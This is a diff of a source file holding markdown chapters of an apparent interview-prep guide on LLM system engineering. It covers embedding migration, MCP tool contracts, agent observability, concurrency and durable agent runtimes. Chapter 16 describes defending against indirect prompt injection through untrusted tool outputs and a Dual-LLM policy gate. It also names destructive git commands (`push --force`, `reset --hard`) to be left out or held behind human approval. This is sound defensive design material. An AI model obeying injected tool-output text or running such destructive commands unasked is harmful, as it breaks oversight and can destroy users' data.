+What happens when you upgrade from `embed-v1` (`768-dim`) to `embed-v2` (`1,024-dim`)?
+- **Vector Space Incompatibility:** You **cannot** compare a `v2` query vector against `v1` document vectors—their coordinate spaces are orthogonal!
+- **Blue/Green Shadow Migration:**
+  1. Stamp every vector row/collection with `embedding_model_version`.
+  2. Spin up `chunks_index_v2` in the background; run a rate-limited batch worker over object storage + replay live Kafka CDC writes into **both** `v1` and `v2`.
+  3. Run `1%` shadow reads against `v2` to verify `Recall@50` and `nDCG@5` improve on your golden eval set.
+  4. Flip the query router alias atomically from `chunks_index_v1` to `chunks_index_v2`, keeping `v1` warm for 24 hours for instant rollback before dropping it.
+
+:::
 
 ---
 
@@ -1294,6 +1447,11 @@ How do you search 10 million `1,536-dim float32` vectors in `5 ms` instead of a 
 <p><strong>Answer:</strong> Pick <strong><code>pgvector</code></strong>: 5M vectors fit easily in a single Postgres HNSW index with <code>halfvec</code>, allow transactional updates alongside session rows, and avoid distributed cluster overhead and CDC lag.</p>
 </details>
 
+<details>
+<summary><strong>Q4: Why can't you gradually overwrite vectors in-place inside a single HNSW index when upgrading your embedding model?</strong></summary>
+<p><strong>Answer:</strong> Vectors from two different embedding models occupy incompatible geometric spaces, so mixed distances are meaningless and corrupt HNSW graph navigation. Always build a parallel shadow index (<code>v2</code>), dual-write CDC, and flip an alias atomically.</p>
+</details>
+
 ---
 
 ### Sources & References
@@ -1306,11 +1464,11 @@ How do you search 10 million `1,536-dim float32` vectors in `5 ms` instead of a 
         "ch16-mcp-tools-and-safety.md",
         """# Chapter 16: Model Context Protocol (MCP), Tool Contracts & Prompt Injection Defense
 
-*Part III · AI & LLM Engineering Systems · 8 min read*
+*Part III · AI & LLM Engineering Systems · 8 min core · 19 min with deep dives*
 
 Connecting 5 internal AI agents to 10 enterprise microservices used to mean writing **50 bespoke integration wrappers** (`M × N` glue code), each with its own brittle JSON parser and ad-hoc retry logic.
 
-**MCP (Model Context Protocol)** solves that the same way LSP solved code editors: a single **JSON-RPC 2.0** protocol (`stdio` locally or **Streamable HTTP + SSE** remotely) that decouples **Agent Orchestrators (MCP Clients)** from **Tool Providers (MCP Servers)** [1].
+**MCP (Model Context Protocol)** solves that the same way LSP solved code editors: a single **JSON-RPC 2.0** protocol (`stdio` locally or **Streamable HTTP** remotely) that decouples **AI Applications (MCP Hosts & Clients)** from **Capability Providers (MCP Servers)** [1].
 
 Let us examine the upper half of the diagram in Chapter 15 to see how MCP primitives, self-healing tool contracts, and **Indirect Prompt Injection** defenses work together [1, 2, 3].
 
@@ -1326,6 +1484,23 @@ Every MCP Server exposes capabilities through three strictly separated primitive
 | **2. `Resources`** | **The Host App** | `resources/list`, `resources/read` | Read-only URI data streams (`postgres://prod/schema`, `file:///logs/app.log`) without granting execution rights. |
 | **3. `Prompts`** | **The User** | `prompts/list`, `prompts/get` | Parameterized workflow templates (`diagnose-incident`) explicitly invoked via slash commands or UI. |
 
+:::deepdive MCP Architecture (2026-07-28 Spec): 1:1 Host–Client–Server, Transports & Wrapping REST | +5 min
+
+Interviewers frequently test whether you confuse **MCP** with **LLM function calling** or **REST microservices** [1]:
+
+1. **The Strict `1:1` Connection Topology:**
+   - **MCP Host** (the AI application, e.g., IDE or enterprise assistant): Owns user consent UI, credential vaults, context aggregation, and LLM sampling.
+   - **MCP Client** (spawned inside the Host): Maintains a **strictly `1:1` isolated connection** to a single MCP Server, negotiating capabilities (`initialize`) and attaching protocol version metadata to every stateless request [1].
+   - **MCP Server** (local subprocess via **`stdio`** or remote service via **Streamable HTTP**): Exposes domain capabilities without ever seeing the full conversation history or credentials belonging to *other* MCP servers!
+2. **MCP vs. Function Calling vs. REST APIs:**
+   - *Function calling* is the vendor-specific inference format between the **Host and the LLM**.
+   - *MCP* is the standardized discovery and execution wire protocol between the **Client and the Tool/Context Server**.
+   - *REST/gRPC* remains underneath! You **do not rewrite** your core Orders REST microservice into MCP; you build a thin **MCP Server adapter** that aggregates chatty REST endpoints into coarse, token-efficient agent tools (`get_order_diagnostics` instead of 6 low-level REST calls).
+3. **Design Drill — Designing a Safe Git MCP Server:**
+   - Expose **read-only `Resources`** (`git://repo/status`, `git://repo/diff/{sha}`), **bounded `Tools`** (`git_log`, `git_create_branch`, `git_commit_staged`), and **human-gated destructive tools** (omit `push --force` and `reset --hard` entirely, or gate `git_push` on explicit Host user approval), strictly canonicalizing repo paths inside an allowed workspace root.
+
+:::
+
 ---
 
 ### 2) Self-Healing Tool Contracts & Write Idempotency
@@ -1336,6 +1511,25 @@ In production, a tool wrapper must never crash an agent run with an unhandled st
    - On a **`400 Invalid Argument`** (`expected YYYY-MM-DD, got 'yesterday'`), return `{"isError": true, "retryable_by_model": true, "hint": "Use ISO-8601 YYYY-MM-DD"}` so the LLM self-corrects on its next turn.
    - On a **`503 Downstream Outage`**, retry with exponential backoff + jitter inside the tool client; if still down, trip a **Circuit Breaker** and return `{"isError": true, "retryable_by_model": false}` so the agent stops hammering a dead service.
 3. **Deterministic Write Idempotency:** Compute **`idempotency_key = SHA256(run_id + step_idx + tool_name + canonical_args)`** in the orchestrator and lock `SET idem:<key> result NX EX 86400` in Redis so a retried tool call never issues a duplicate refund or ticket.
+
+:::deepdive The 7-Step Tool Execution Sequence, Output Trust Boundaries & Compensating Sagas | +5 min
+
+Remember the core execution invariant: **the LLM only proposes a structured call; the Host application validates, authorizes, executes, and sanitizes** [2]:
+
+```text
+1. Model emits structured tool call JSON
+2. Host runs RBAC/OPA policy + human-approval check (injecting caller JWT)
+3. Host validates input arguments against JSON Schema + domain bounds
+4. Executor runs tool with per-call timeout, cancellation token & idempotency key
+5. Host validates & truncates OUTPUT (Tool-Result Trust Boundary + secret redaction)
+6. Audit logger records immutable trace span (caller, args_hash, latency, status)
+7. Sanitized observation enters context -> Model picks next step or terminates
+```
+
+- **Why Step 5 (Output Validation) Matters:** Tool outputs from web pages, Jira tickets, or logs are **untrusted input**! Validate output schemas, strip credentials/tokens accidentally returned by internal APIs, cap payload size (`<= 4 KB`), and wrap untrusted text in explicit data delimiters.
+- **Partial Failure & Compensating Sagas:** If an agent executes `reserve_inventory()` (succeeds) followed by `create_shipment()` (fails permanently), there are no distributed 2PC locks across SaaS APIs. Record each mutating step's **compensating action** (`release_inventory(reservation_id)`) in the run journal and run compensations in reverse order on abort.
+
+:::
 
 ---
 
@@ -1355,7 +1549,7 @@ In an LLM, **system instructions and untrusted external data (emails, tickets, w
 
 - **Real-world analogy:** **Dual-LLM + Policy Gate** works like a browser's **Multi-Process Sandbox**: an untrusted renderer process (Quarantined LLM) cannot touch the OS directly; it can only send a strictly typed struct to the privileged broker process (Policy Gate), which checks permissions before acting.
 - **Where the analogy breaks:** If the Quarantined LLM copies an unvalidated free-form string into the Privileged LLM's prompt, the injection crosses the boundary—so only **enums, booleans, numbers, and verified IDs** may cross between the two models [3].
-- **Real production system:** **Claude, VS Code Copilot, and Spring AI MCP** standardize tool discovery, JSON Schema validation, and human approval gates over MCP [1].
+- **Real production system:** **Claude, VS Code Copilot, and Spring AI MCP** standardize tool discovery, `1:1` isolated client connections, JSON Schema validation, and human approval gates over MCP [1].
 
 ---
 
@@ -1376,10 +1570,15 @@ In an LLM, **system instructions and untrusted external data (emails, tickets, w
 <p><strong>Answer:</strong> For <code>400 Invalid Date</code>, return <code>isError: true, retryable_by_model: true</code> with a format hint so the LLM self-corrects. For <code>503 Database Down</code>, retry briefly with backoff inside the client, then trip a circuit breaker and return <code>retryable_by_model: false</code> so the agent degrades gracefully.</p>
 </details>
 
+<details>
+<summary><strong>Q4: Why does an MCP Host create a separate <code>1:1</code> MCP Client per MCP Server instead of sharing one global bus across all servers?</strong></summary>
+<p><strong>Answer:</strong> Strict <code>1:1</code> client-to-server isolation enforces independent capability negotiation, per-server credential scoping, fault isolation if one server crashes, and prevents Server A from snooping on prompts or context destined for Server B.</p>
+</details>
+
 ---
 
 ### Sources & References
-- **[1]** Model Context Protocol (MCP) Specification — *JSON-RPC 2.0 Transport, Tools, Resources & Prompts* — [modelcontextprotocol.io/specification](https://modelcontextprotocol.io/specification)
+- **[1]** Model Context Protocol (MCP) Architecture Specification (`2026-07-28`) — *Host, Client & Server Isolation, Primitives & Transports* — [modelcontextprotocol.io/specification/2026-07-28/architecture](https://modelcontextprotocol.io/specification/2026-07-28/architecture)
 - **[2]** Anthropic Engineering, *Writing Effective Tools for Agents — With Agents* (2025)
 - **[3]** Edoardo Debenedetti et al., *Defeating Prompt Injections by Design (CaMeL)* (Google DeepMind, 2025) — [arxiv.org/abs/2503.18813](https://arxiv.org/abs/2503.18813)
 """
@@ -1388,7 +1587,7 @@ In an LLM, **system instructions and untrusted external data (emails, tickets, w
         "ch17-agent-observability-and-evals.md",
         """# Chapter 17: Agent Observability (OpenTelemetry), Deterministic Replay & Canary Rollouts
 
-*Part III · AI & LLM Engineering Systems · 7 min read*
+*Part III · AI & LLM Engineering Systems · 7 min core · 16 min with deep dives*
 
 When a REST microservice fails, it throws an `HTTP 500` and a stack trace.
 
@@ -1406,6 +1605,19 @@ A single agent run is a **tree of spans** across memory, LLM calls, and parallel
 - **LLM Span (`gen_ai.chat`):** Captures `model`, `input_tokens`, **`cached_input_tokens`** (to catch KV-cache regressions instantly!), `output_tokens`, and `ttft_ms`.
 - **Tool Span (`mcp.tool.execute`):** Captures `tool.name`, `idempotency_key`, `is_error`, and `retry_count`.
 - **Privacy Rule:** Scrub PII in the OTel Collector before spans hit Jaeger/Honeycomb/Phoenix; keep raw encrypted payloads in an access-controlled audit store with a 30-day TTL.
+
+:::deepdive The Complete Production Agent Metric Taxonomy | +5 min
+
+Define **task success** before picking metrics, then monitor four orthogonal metric buckets so optimizing one cannot silently break another [2, 3]:
+
+| Metric Bucket | Key Production Metrics | Why Single Metrics Mislead Without It |
+| :--- | :--- | :--- |
+| **1. Outcome Quality** | **`task_success_rate`** (end-state verified), **`citation_precision`** (`supported_claims / cited_claims`). | High user chat engagement often means the user is frustrated and arguing with a failing agent! |
+| **2. Trajectory & Tool Health** | **`tool_selection_accuracy`**, **`argument_schema_pass_rate`**, **`steps_per_task`**, **`loop_rate`** (`%` runs hitting duplicate calls or `max_steps`). | An agent can achieve `85%` task success by brute-forcing `9` sloppy tool retries per run. |
+| **3. Economics & Latency** | **`cost_per_successful_task`** (`total_spend / successful_runs`), **`p50 / p95 TTFT`**, **`end_to_end_duration_ms`**. | *Cost per token* looks cheap on a smaller model until a `2×` drop in success rate makes **`cost_per_successful_task` higher**! |
+| **4. Safety & Escalation** | **`policy_block_rate`**, **`human_escalation_rate`**, **`user_undo_or_revert_rate`**. | Catching silent regressions where an overly cautious prompt escalates `60%` of tickets to humans. |
+
+:::
 
 ---
 
@@ -1428,6 +1640,17 @@ Treat prompts, tool JSON schemas, and agent graphs as immutable Git-versioned ar
 2. **Shadow (Dark Traffic) Mode (`1%` Live Fork):** Run the new version asynchronously on `1%` of live traffic with all write tools stubbed in **dry-run/no-op mode**, comparing proposed actions against production.
 3. **Progressive Canary (`1% -> 10% -> 50% -> 100%`):** Monitor OTel `tool_error_rate`, `max_steps_exceeded_rate`, `p95_ttft_ms`, user undo/thumbs-down rate, and async `5%` Kafka judge scores.
 4. **Instant Feature-Flag Rollback:** Automatically revert the routing pointer to the prior `prompt_sha` in `< 5s` if any SLO trips.
+
+:::deepdive Design Drill: End-to-End Evaluation Plan Comparing Agent v1 vs. Agent v2 | +4 min
+
+When asked *"Agent v2 switches to a new planner prompt and smaller worker model—how do you prove v2 is safe to ship?"*, walk through four gates:
+
+1. **Stratified Golden Benchmark (`N = 300` cases):** Slice cases across easy happy-path (`40%`), multi-hop edge cases (`30%`), tool-outage recovery (`15%`), and adversarial prompt-injection traps (`15%`). Run **3 trials per case** (`pass^3` consistency metric from `tau-bench` [3]) because an agent with `80%` single-run accuracy succeeds 3 times in a row only `0.8^3 = 51.2%` of the time!
+2. **Paired Diff Analysis:** Inspect every regression where `v1 = PASS` and `v2 = FAIL` before looking at aggregate averages—averages hide catastrophic regressions on rare, high-value intents.
+3. **Shadow Dry-Run Parity (`24 hours`):** Verify `v2`'s proposed write tool calls match `v1` within acceptable divergence and check `cached_input_tokens` ratio hasn't regressed.
+4. **Online A/B Experiment:** Split by `user_id` (not per-request, so multi-turn sessions stay consistent), gating promotion on non-inferior `task_success_rate`, `0` critical safety violations, and improved `cost_per_successful_task`.
+
+:::
 
 ---
 
@@ -1456,6 +1679,11 @@ Treat prompts, tool JSON schemas, and agent graphs as immutable Git-versioned ar
 <p><strong>Answer:</strong> Inject a shadow <code>ToolExecutor</code> that executes read-only tools normally (or reads cached observations) while intercepting all state-mutating write tools in <strong>dry-run mode</strong>, logging the proposed payload for comparison.</p>
 </details>
 
+<details>
+<summary><strong>Q4: Why is <code>cost_per_successful_task</code> a better North Star economic metric than <code>cost_per_1k_tokens</code>?</strong></summary>
+<p><strong>Answer:</strong> A cheaper model that loops twice as long or fails half the time forces retries and human escalations, raising total spend per resolved user goal even though its per-token price is lower.</p>
+</details>
+
 ---
 
 ### Sources & References
@@ -1468,7 +1696,7 @@ Treat prompts, tool JSON schemas, and agent graphs as immutable Git-versioned ar
         "ch18-reactive-backend-and-concurrency.md",
         """# Chapter 18: Reactive Agent Backends (Spring WebFlux), High-Contention Concurrency & Keyset Pagination
 
-*Part III · AI & LLM Engineering Systems · 8 min read*
+*Part III · AI & LLM Engineering Systems · 8 min core · 17 min with deep dives*
 
 An LLM is only 20% of a production agent platform. The other 80% is high-concurrency backend systems engineering:
 1. Holding **50,000 open streaming connections** for 10 seconds each without exhausting OS threads.
@@ -1490,6 +1718,18 @@ Now replace that with an **AI Agent stream** that runs for **`10 seconds`**: eac
 - **`Mono.zip(toolA, toolB, toolC)`:** Dispatches a parallel DAG wave of independent MCP tools concurrently.
 - **Golden Rule:** Never block a Netty event-loop thread! Offload any legacy blocking JDBC or CPU work via **`.subscribeOn(Schedulers.boundedElastic())`**.
 
+:::deepdive End-to-End Cancellation Propagation, Bulkhead Pools & Backpressure | +5 min
+
+What happens when a user closes their browser tab `2 seconds` into a `15-second` multi-tool agent run? Without explicit **cancellation propagation**, your backend keeps burning GPU tokens and executing downstream tools for a nobody!
+
+1. **Cooperative Cancellation Chain:**
+   - Netty detects TCP `FIN/RST` on the SSE socket -> triggers Reactor `.doOnCancel()` (or `AbortSignal` / `Context` cancellation).
+   - The orchestrator immediately aborts the upstream HTTP stream to the LLM provider (stopping token generation & billing mid-sentence) and sends JSON-RPC `notifications/cancelled` to any in-flight MCP tool servers.
+2. **Thread/Worker Bulkhead Isolation:** Never share one worker pool across fast API reads, slow PDF parsing, and untrusted tool sandboxes. Isolate into separate bounded pools (**Bulkhead Pattern**) so a spike in slow PDF ingestion can only saturate its own `32`-worker pool while normal chat streams stay sub-second.
+3. **Reactive Backpressure:** If a fast producer (`500 tokens/sec` batch stream or log tail) overwhelms a slow mobile client or DB sink, unbounded memory buffers trigger `OutOfMemoryError`. Enforce bounded ring buffers (`onBackpressureBuffer(256, DROP_OLDEST)` for UI progress events, or TCP window throttling / `429 Retry-After` at ingress).
+
+:::
+
 ---
 
 ### 2) Concurrency Under the Hood: `counter++`, `AtomicLong` vs. `LongAdder`
@@ -1503,6 +1743,16 @@ When interviewers ask how to fix a high-throughput shared counter (like a global
 | **1. `synchronized` / `ReentrantLock`** | OS/JVM mutex; losing threads sleep (`~2–5 µs` context switch). | Threads queue and sleep; safe for multi-variable invariants. | Compound state mutations (e.g., `HashMap` + Doubly Linked List in a thread-safe LRU cache). |
 | **2. `AtomicLong` (`CAS` loop)** | Hardware CPU `LOCK CMPXCHG` retry loop on one memory address. | **Cache-line ping-pong!** All 64 cores invalidate the *exact same 64-byte L1/L2 cache line*, wasting CPU cycles on failed CAS retries. | Low/moderate contention (`1–8` threads) or atomic state flags. |
 | **3. `LongAdder` (Striped `Cell[]`)** | Shards the counter across cache-line-padded `Cell[]` slots; `.sum()` adds them on read. | **`8×–10×` higher throughput** than `AtomicLong` at 64 cores! | High-contention telemetry counters & token meters. |
+
+:::deepdive Deadlock Prevention & Distributed Locks with Monotonic Fencing Tokens | +4 min
+
+- **In-Process Deadlocks:** Occur when Thread 1 locks `Account A` then `Account B` while Thread 2 locks `B` then `A`. Eliminate circular wait deterministically by acquiring locks in **strict global ID order** (`first = min(idA, idB), second = max(idA, idB)`).
+- **Distributed Locks & The GC-Pause Trap [3]:** Suppose Worker 1 acquires a Redis lock `SET lock:run_42 w1 NX EX 10`, then hits a `12-second` JVM GC pause. At second `11`, the lock expires and Worker 2 acquires it. At second `12`, Worker 1 wakes up believing it *still* holds the lock and overwrites Postgres!
+  - **The Kleppmann Fix (Monotonic Fencing Tokens):** Every lock acquisition increments a monotonic `lease_epoch` (`1, 2, 3...`). Pass `lease_epoch` into every storage write:
+    `UPDATE agent_runs SET state = :s, epoch = :e WHERE run_id = :id AND epoch <= :e`
+    When stale Worker 1 (`epoch = 1`) wakes up after Worker 2 (`epoch = 2`), Postgres deterministically rejects Worker 1's write!
+
+:::
 
 ---
 
@@ -1546,12 +1796,254 @@ When interviewers ask how to fix a high-throughput shared counter (like a global
 <p><strong>Answer:</strong> <code>COUNT(*) = 10</code>, <code>COUNT(score) = 7</code>, and <code>AVG(score) = 10.0</code> (dividing <code>70 / 7</code>, ignoring <code>NULL</code> rows).</p>
 </details>
 
+<details>
+<summary><strong>Q4: Why is a Redis TTL lock alone unsafe when two agent workers might mutate the same run state, and what makes it safe?</strong></summary>
+<p><strong>Answer:</strong> A worker can pause (GC/network stall) past its Redis TTL and issue a stale write after a second worker has acquired the lock. Attaching a monotonically increasing <strong>fencing token (<code>lease_epoch</code>)</strong> verified by the database on every write rejects zombie workers deterministically.</p>
+</details>
+
 ---
 
 ### Sources & References
 - **[1]** Spring AI & Spring WebFlux Reference — *Reactive `ChatClient`, `Flux` SSE Streaming & `Schedulers.boundedElastic()`* — [docs.spring.io/spring-ai/reference](https://docs.spring.io/spring-ai/reference/)
 - **[2]** Brian Goetz et al., *Java Concurrency in Practice* & JDK `LongAdder` — CAS Contention vs. Striped Counters
-- **[3]** Martin Kleppmann, *Designing Data-Intensive Applications (DDIA)*, Chapter 3: B-Trees, Keyset Scans & Column-Oriented OLAP Storage
+- **[3]** Martin Kleppmann, *Designing Data-Intensive Applications (DDIA)*, Chapter 3 (Storage Engines) & Chapter 8 (Fencing Tokens & Distributed Locks)
+"""
+    ),
+    (
+        "ch19-durable-agent-runtime.md",
+        """# Chapter 19: Durable Agent State Machines, Async Run APIs & Scaling to 1M Runs/Day
+
+*Part IV · Autonomous Agent Systems · 8 min core · 18 min with deep dives*
+
+In a prototype, an agent is a `while` loop inside an `HTTP POST /chat` handler.
+
+In production, that design collapses the first afternoon you get real traffic:
+1. A tool call needs **human manager approval**—which takes `4 hours`. You cannot hold an HTTP socket or a worker pod open for 4 hours!
+2. Worker Pod #12 gets evicted by Kubernetes on **Step 4 of 6**, losing the first 3 LLM calls and double-charging the customer on retry.
+3. A single enterprise tenant kicks off a `50,000-row` batch agent job at 9:00 AM, exhausting your global LLM Tokens-Per-Minute (`TPM`) quota and taking down every interactive user.
+
+The architectural fix is fundamental: **model every agent run as an asynchronous, checkpointed Durable State Machine** decoupled from HTTP connections [1, 2].
+
+{{diagram:07-durable-agent-runtime.excalidraw}}
+
+---
+
+### 1) The Async Agent Run API & Durable State Lifecycle
+
+Instead of blocking inside one synchronous request, expose a **5-endpoint Asynchronous Run Resource** (similar to OpenAI Assistants/Responses background runs, Temporal workflows, and LangGraph Cloud) [1, 2]:
+
+| Endpoint | HTTP Contract | What Happens Under the Hood |
+| :--- | :--- | :--- |
+| **`POST /agent/runs`** | Accepts `Idempotency-Key` + goal; returns **`202 Accepted`** + `{run_id, status: "QUEUED"}` in `< 25 ms`. | Inserts `agent_runs` row (`QUEUED`) and publishes `run_id` to `Kafka: agent.runs` via transactional outbox. |
+| **`GET /agent/runs/{id}`** | Returns current state (`QUEUED`, `RUNNING`, `WAITING_APPROVAL`, `COMPLETED`, `FAILED`, `CANCELLED`). | Fast primary-key read from Postgres / Redis state cache for polling or UI hydration. |
+| **`GET /agent/runs/{id}/events`** | Server-Sent Events (`SSE`) accepting **`Last-Event-ID: 42`** header. | Replays any missed events `> 42` from a **Redis Stream (`XREAD`)** before tailing live tokens—surviving mobile Wi-Fi drops seamlessly! |
+| **`POST /runs/{id}/approvals`** | Submits `{step_id, decision: "APPROVED" or "REJECTED"}`. | Transitions state `WAITING_APPROVAL -> QUEUED` and re-enqueues `run_id` so *any* stateless worker resumes from the checkpoint! |
+| **`POST /runs/{id}/cancel`** | Sets `cancel_requested = true` + publishes cancel signal on Redis Pub/Sub. | Active worker aborts in-flight LLM/MCP calls at the next token/checkpoint and transitions to `CANCELLED`. |
+
+**Zero-Thread Human-in-the-Loop (`WAITING_APPROVAL`):**
+When the policy gate intercepts a high-impact write (`refund_order($250)`), the worker persists the proposed tool payload into `agent_steps`, sets `status = WAITING_APPROVAL`, emits an `approval.required` SSE event, **and exits cleanly—holding zero threads, zero RAM, and zero DB locks** whether the human responds in `3 seconds` or `3 days` [1]!
+
+:::deepdive Crash Recovery Mechanics: Step Journals, Leases & Idempotent Replay | +5 min
+
+How do you guarantee a multi-step agent run survives a worker pod crash on Step 4 without re-running Steps 1–3?
+
+1. **Two-Table Durable Checkpoint Schema (PostgreSQL):**
+   - `agent_runs(run_id PK, tenant_id, status, current_step, lease_owner, lease_expires_at, lease_epoch, budget_spent_usd)`
+   - `agent_steps(run_id, step_idx, phase, input_hash, output_json, prompt_tokens, cost_usd, PRIMARY KEY (run_id, step_idx))`
+2. **Lease + Heartbeat Acquisition:**
+   - Worker claims a run via atomic `UPDATE agent_runs SET lease_owner = :pod, lease_expires_at = now() + 15s, lease_epoch = lease_epoch + 1` and renews every `5s`.
+   - Before every LLM call or tool execution, the worker checks if `(run_id, step_idx)` already has a committed `output_json` in `agent_steps`.
+3. **Mid-Step Pod Death Walkthrough:**
+   - Suppose Pod A finishes Steps `1..3` (committed to `agent_steps`), calls `create_jira_ticket()` in Step `4` with `idempotency_key = SHA256(run_id + ":4")`, and OOM-crashes *before* writing Step 4's result to Postgres.
+   - `15 seconds` later, a lease-reaper re-queues `run_id`. Pod B loads Steps `1..3` directly from `agent_steps` (`0` LLM tokens spent!), re-invokes Step `4` with the **exact same deterministic `idempotency_key`**, receives the cached Jira ticket ID from the deduplication layer, commits Step `4` with `lease_epoch`, and finishes the run!
+
+:::
+
+---
+
+### 2) Scaling to 1,000,000 Agent Runs/Day: Routing, Failover & Token Quotas
+
+Running `1,000,000` multi-step tasks per day introduces failure modes that ordinary CRUD microservices never face—specifically **multi-second GPU latency spikes**, **provider `429` TPM limits**, and **noisy-neighbor token starvation** [2, 3]:
+
+1. **Tiered Model Routing (`70 / 30` Split):**
+   - A fast router classifies incoming steps: **`~70%` of steps** (intent routing, query rewriting, schema extraction, simple tool selection) go to a compact, fast model (`~10×` cheaper, `250 ms` TTFT), escalating only **`~30%` of complex reasoning/synthesis steps** to a frontier model.
+2. **Health-Scored Provider Failover & Circuit Breakers:**
+   - Track rolling `30s` windows of `HTTP 429/5xx` and `p95 TTFT` per `(provider, region, model)`. If `us-east` hits a GPU brownout, trip the circuit breaker to `OPEN` and fail over new turns to `eu-west` or a secondary model family via a normalized OpenAI/Spring-AI schema adapter—while keeping healthy runs **sticky by `run_id`** to preserve GPU KV prefix caches!
+3. **Two-Phase Redis Lua Token & Cost Budgets:**
+   - Standard request-count rate limiting (`100 req/min`) fails when Request A uses `400` tokens and Request B uses `60,000` tokens.
+   - **Pre-Flight Reserve + Post-Turn Reconcile:** Before calling the LLM, atomically reserve `estimated_input_tokens + max_output_tokens` in a per-tenant Redis Lua token bucket. Once the stream finishes, refund `max_output_tokens - actual_output_tokens` and increment `tenant_daily_spend_usd`—halting runaway tenants before they exceed their contract cap.
+
+:::deepdive Envelope Capacity Math & Fair Queuing for 1,000,000 Runs/Day | +5 min
+
+Always ground a `1M runs/day` design prompt with 60-second back-of-the-envelope numbers:
+
+- **Throughput & Concurrency:**
+  - Average runs/sec: `1,000,000 / 86,400 ≈ 11.6 runs/s` -> **Peak (`5×` diurnal spike) `≈ 60 runs/s`**.
+  - Average `4` LLM turns/run -> **`240` peak LLM QPS** and **`~180` peak tool QPS**.
+  - At `4,000` avg tokens/turn (`80%` KV-cached input + `400` output tokens): **`240 × 4,000 ≈ 960,000 tokens/sec` (`~58M TPM` peak)** across your model endpoints!
+  - If an active run takes `6 seconds` on average, Little's Law (`L = λ × W`) gives `60 runs/s × 6s = 360` concurrent active runs—easily served by **`8–12` reactive orchestrator pods**!
+- **Multi-Tenant Noisy-Neighbor Isolation:**
+  - Never put interactive user chat runs and `50,000-item` offline batch runs into the same FIFO queue!
+  - Split into **`agent.runs.interactive`** (SLO `< 3s` TTFT, dedicatedTPM reservation) and **`agent.runs.batch`** (spot/provisioned-spillover capacity), using **Weighted Fair Queuing / Deficit Round Robin per `tenant_id`** so Tenant A submitting 10,000 jobs cannot delay Tenant B's single interactive request by more than one scheduling quantum.
+
+:::
+
+---
+
+### Analogy, Where It Breaks & Real System
+
+- **Real-world analogy:** A synchronous HTTP agent is a phone call where hanging up forces you to start your tax return over from Line 1. A **Durable Checkpointed Agent** is a cloud spreadsheet saved after every cell: if your laptop battery dies or you pause 2 days waiting for your accountant's signature, another browser opens right at Row 42.
+- **Where the analogy breaks:** Re-opening a spreadsheet has no external side effects; replaying an agent step that calls Stripe or GitHub *does*—which is why durable state machines **only work when paired with deterministic step idempotency keys** [1].
+- **Real production system:** **Temporal**, **LangGraph Platform**, and **OpenAI Background Responses** execute long-horizon agents as event-sourced/checkpointed state machines with resumable SSE streams [1, 2].
+
+---
+
+### Quick Self-Check
+
+<details>
+<summary><strong>Q1: How should an agent runtime pause for a human approval that might take 6 hours without holding open a worker thread or database transaction?</strong></summary>
+<p><strong>Answer:</strong> Persist the pending tool call and checkpoint state to the database with <code>status = WAITING_APPROVAL</code>, emit an SSE notification, and release the worker completely. When <code>POST /runs/{id}/approvals</code> arrives hours later, re-enqueue <code>run_id</code> so any stateless worker resumes from the saved checkpoint.</p>
+</details>
+
+<details>
+<summary><strong>Q2: How does <code>GET /agent/runs/{id}/events</code> recover cleanly when a mobile client drops Wi-Fi for 4 seconds mid-stream?</strong></summary>
+<p><strong>Answer:</strong> Every SSE frame carries a sequential <code>id: &lt;seq&gt;</code> backed by a short-TTL Redis Stream. On reconnect, the browser automatically sends <code>Last-Event-ID: &lt;seq&gt;</code>, allowing the gateway to replay missed frames from Redis before resuming live tailing.</p>
+</details>
+
+<details>
+<summary><strong>Q3: Why do LLM gateways use two-phase Token Reservation (<code>reserve</code> before prefill, <code>reconcile</code> after stream) instead of counting tokens only after the response completes?</strong></summary>
+<p><strong>Answer:</strong> Because LLM calls take seconds: if you only debit quota after completion, a burst of 500 concurrent requests from one tenant will all pass the pre-check simultaneously and blow past the TPM limit by <code>500×</code> before the first stream finishes.</p>
+</details>
+
+<details>
+<summary><strong>Q4: Why should a multi-region LLM router prefer sticky routing by <code>run_id</code> during normal operation rather than round-robin across regions on every turn?</strong></summary>
+<p><strong>Answer:</strong> Sticky routing keeps consecutive turns of the same multi-step run on the same inference cluster so GPU <strong>KV Prefix Caches</strong> stay warm—saving <code>75%+</code> TTFT and up to <code>90%</code> cached input cost—only failing over across regions when health checks trip.</p>
+</details>
+
+---
+
+### Sources & References
+- **[1]** Temporal Engineering, *Durable Execution for AI Agents & Human-in-the-Loop Workflows* (2025) — [temporal.io](https://temporal.io/)
+- **[2]** Anthropic & OpenAI API Guides, *Streaming Responses, Background Runs & Rate-Limit Token Buckets* (2025–2026)
+- **[3]** Martin Kleppmann, *Designing Data-Intensive Applications (DDIA)* — Event-Driven State Machines, Leases & Idempotency
+"""
+    ),
+    (
+        "ch20-agent-system-design-stories.md",
+        """# Chapter 20: End-to-End Agent System Design Stories (Coding, MCP Enterprise, Support & Research)
+
+*Part IV · Autonomous Agent Systems · 9 min core · 20 min with deep dives*
+
+In a senior GenAI or Agent System Design interview, the prompt is intentionally ambiguous:
+*"Design an autonomous bug-fixing agent for our monorepo"* or *"Design an enterprise assistant connecting to Git, Jira, and Postgres."*
+
+Candidates who jump straight into drawing vector databases or naming SDKs lose structure fast. Strong candidates drive a repeatable **12-Step First-Principles Agent Blueprint**, starting with the simplest viable architecture and adding autonomy only where deterministic code falls short [1, 2, 3].
+
+{{diagram:08-agent-case-studies.excalidraw}}
+
+---
+
+### 1) The 12-Step Agent System Design Blueprint
+
+Keep this mental checklist ready for any `45-minute` agent design interview [1, 2]:
+
+| Phase | Steps to Cover | Key Engineering Decision |
+| :--- | :--- | :--- |
+| **A. Scope & Justification (`5 min`)** | **1.** Clarify goal, users, success metrics & *prohibited outcomes*.<br>**2.** Pin scale, p95 latency, cost/task & privacy constraints.<br>**3.** Justify **Single Call vs. Workflow vs. Agent** [1]. | Never default to an open-ended agent if a deterministic workflow handles `80%+` of traffic! |
+| **B. Intelligence & Context (`10 min`)** | **4.** Tiered model routing & fallback strategy.<br>**5.** Context routing (`Prompt` vs `RAG` vs `4-Tier Memory` vs `Live Tool`) + KV-cache prefix order. | Put static schemas first; pre-filter RAG by ACLs; keep live state behind tools. |
+| **C. Tools, Loop & Runtime (`15 min`)** | **6.** Tool / MCP contracts, schemas & `1:1` auth boundaries.<br>**7.** Loop topology (`DAG`, `Evaluator-Optimizer`, `Handoffs`), budgets & HITL.<br>**8.** Durable checkpoints, retries, idempotency & Sagas. | Model runs as checkpointed state machines; bind identity from caller tokens, never LLM args. |
